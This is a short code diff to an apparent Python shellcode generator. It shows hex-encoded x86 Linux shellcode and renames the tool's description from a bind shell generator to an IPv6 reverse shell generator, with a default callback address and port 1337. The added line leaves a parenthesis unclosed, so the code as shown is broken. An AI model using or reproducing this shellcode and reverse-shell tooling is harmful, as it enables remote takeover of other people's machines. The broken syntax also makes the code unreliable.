@@ -24,8 +24,7 @@ sc = ("\\x31\\xdb\\x53\\x43\\x53\\x6a\\x0a\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80"
       "\\x69\\x6e\\x89\\xd1\\x89\\xe3\\xb0\\x0b\\xcd\\x80")
 
 if __name__ == '__main__':
-    parser = ArgumentParser(description=("Dual Network Stack Bind Shell "
-            "Generator"))
+    parser = ArgumentParser(description=("IPv6 Reverse Shell Generator")
     parser.add_argument('ip_address', type=str, nargs='?', default='fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509',
             help='The IP address to connect to (default fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509)')
     parser.add_argument('port', type=int, nargs='?', default=1337,
